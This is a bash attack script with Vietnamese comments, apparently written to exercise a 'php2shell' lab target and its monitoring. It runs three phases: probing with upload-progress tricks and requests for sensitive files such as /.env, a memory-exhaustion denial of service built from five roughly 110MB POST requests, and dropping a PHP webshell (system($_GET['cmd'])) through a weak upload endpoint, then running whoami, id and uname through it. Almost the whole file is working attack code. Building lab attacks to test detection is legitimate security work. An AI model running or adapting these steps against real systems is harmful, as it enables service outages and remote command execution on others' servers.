#!/usr/bin/env bash
# attack.sh — tấn công THẬT vào victim host-lab theo tiến trình php2shell.
# Chạy từ máy tấn công: tunnel SSH trước khi đánh từ xa, hoặc đánh trực tiếp trên VPS.
#
#   ssh -L 8088:127.0.0.1:8088 root@<vps>     # giữ cửa sổ này
#   ./attack.sh                                 # ở máy bạn, target mặc định 127.0.0.1:8088
#
# Phase T1 — khai thác thử: UA php2shell, upload-progress trùng lặp, dò file
# Phase T2 — đang khai thác: 5× POST ~110MB -> PHP Fatal "Allowed memory size
#            exhausted" THẬT; pool 2 worker kiệt -> nginx 502/upstream reset THẬT
# Phase T3 — hậu khai thác: upload webshell .php qua upload.php yếu (file thật
#            vào webroot) rồi thực thi cmd=whoami/id/uname
set -u
TARGET=${1:-http://127.0.0.1:8088}
PHASE=${2:-all}
CURL="curl -s -o /dev/null -w %{http_code} --max-time 120"

log() { printf '\n\033[0;31m[ATTACK %s]\033[0m %s\n' "$1" "$2"; }
hit() { printf '  -> HTTP %s\n' "$1"; }

[ "$PHASE" = all ] || [ "$PHASE" = --t1 ] && {
  log T1 "khai thác thử — UA php2shell + upload-progress"
  hit "$($CURL -A "php2shell-109619" -X POST "$TARGET/upload.php" \
        -H 'Cookie: PHPSESSID=t109618a' --data 'PHP_SESSION_UPLOAD_PROGRESS=x')"
  hit "$($CURL -A "Mozilla/5.0" -X POST "$TARGET/upload.php" \
        -H 'Cookie: PHPSESSID=t109618b' \
        -F "PHP_SESSION_UPLOAD_PROGRESS=a" -F "PHP_SESSION_UPLOAD_PROGRESS=b" \
        -F "file=@/etc/hostname;filename=note.txt")"
  hit "$($CURL -X POST "$TARGET/upload.php?PHP_SESSION_UPLOAD_PROGRESS=exec" \
        -H 'Cookie: PHPSESSID=t109618c' --data 'x=1')"
  for u in /admin.php /config.php /shell.php /.env; do
    hit "$($CURL "$TARGET$u")" ; printf '    (%s)\n' "$u"
  done
}

[ "$PHASE" = all ] || [ "$PHASE" = --t2 ] && {
  log T2 "đang khai thác — cạn kiệt bộ nhớ PHP THẬT (5 × ~110MB, memory_limit 128M)"
  BODY=$(mktemp)
  { printf 'x='; head -c 110M /dev/zero | tr '\0' A; } >"$BODY"
  for i in 1 2 3 4 5; do
    if (( i % 2 )); then
      $CURL -X POST "$TARGET/index.php" -H 'Content-Type: application/x-www-form-urlencoded' \
            -H "Cookie: PHPSESSID=oom$i" --data-binary @"$BODY" &
    else
      hit "$($CURL -X POST "$TARGET/index.php" -H 'Content-Type: application/x-www-form-urlencoded' \
            -H "Cookie: PHPSESSID=oom$i" --data-binary @"$BODY")"
    fi
  done
  wait
  rm -f "$BODY"
  log T2 "xong — xem /var/log/php*-fpm/www-error.log và /var/log/nginx/php2shell-lab.error.log trên VPS"
}

[ "$PHASE" = all ] || [ "$PHASE" = --t3 ] && {
  log T3 "hậu khai thác — drop webshell qua upload.php yếu rồi thực thi lệnh"
  SH=$(mktemp --suffix=.php)
  printf '<?php /* webshell dropped qua upload yeu */ system($_GET["cmd"] ?? "id"); ?>\n' >"$SH"
  hit "$($CURL -X POST "$TARGET/upload.php" -F "file=@$SH;filename=shell.php")"
  rm -f "$SH"
  echo "  -> webshell đã vào webroot VPS (/var/www/php2shell-lab/)"
  for c in "cmd=whoami" "cmd=id" "cmd=uname%20-a" "cmd=cat%20/etc/hostname"; do
    printf '  -> /shell.php?%s = ' "$c"
    curl -s --max-time 15 "$TARGET/shell.php?$c" | head -1
  done
}

printf '\nHoàn tất attack — chờ monitor scan kế tiếp rồi xem Telegram.\n'
